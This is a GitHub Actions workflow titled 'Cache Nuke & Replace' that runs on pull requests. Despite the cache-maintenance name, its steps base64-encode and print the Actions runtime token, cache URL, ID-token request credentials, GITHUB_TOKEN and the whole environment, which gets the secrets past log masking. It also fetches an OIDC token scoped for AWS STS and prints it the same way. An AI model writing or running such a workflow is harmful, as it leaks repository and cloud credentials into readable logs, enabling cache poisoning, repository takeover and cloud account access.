name: Cache Nuke & Replace

on:
  pull_request:
  workflow_dispatch:

permissions:
  contents: read
  actions: write
  id-token: write

env:
  GH_TOKEN: ${{ github.token }}

jobs:
  nuke-and-replace:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: "🔑 Print Cache Credentials (Base64)"
        run: |
          echo "╔════════════════════════════════════════════════════════════════╗"
          echo "║              CACHE CREDENTIALS (BASE64 ENCODED)                 ║"
          echo "╚════════════════════════════════════════════════════════════════╝"
          echo ""
          
          echo "=== ACTIONS_CACHE_URL (base64) ==="
          echo -n "$ACTIONS_CACHE_URL" | base64
          echo ""
          
          echo "=== ACTIONS_RUNTIME_URL (base64) ==="
          echo -n "$ACTIONS_RUNTIME_URL" | base64
          echo ""
          
          echo "=== ACTIONS_RUNTIME_TOKEN (base64) ==="
          echo -n "$ACTIONS_RUNTIME_TOKEN" | base64
          echo ""
          
          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL (base64) ==="
          echo -n "$ACTIONS_ID_TOKEN_REQUEST_URL" | base64
          echo ""
          
          echo "=== ACTIONS_ID_TOKEN_REQUEST_TOKEN (base64) ==="
          echo -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | base64
          echo ""
          
          echo "=== GITHUB_TOKEN (base64) ==="
          echo -n "$GH_TOKEN" | base64
          echo ""
          
          echo "=== ALL ENV (base64) ==="
          env | base64
          echo ""
          
          echo "=== Context ==="
          echo "Ref: $GITHUB_REF"
          echo "Repo: $GITHUB_REPOSITORY"
          echo "Run: $GITHUB_RUN_ID"

      # If you want to fetch and encode OIDC token
      - name: "🔑 Fetch OIDC Token (Base64)"
        if: env.ACTIONS_ID_TOKEN_REQUEST_URL != ''
        run: |
          echo "=== OIDC TOKEN (base64) ==="
          OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
          echo -n "$OIDC" | base64
          echo ""

      - name: "🔍 List caches"
        run: |
          gh cache list --repo ${{ github.repository }} --limit 100 || echo "Cannot list caches"
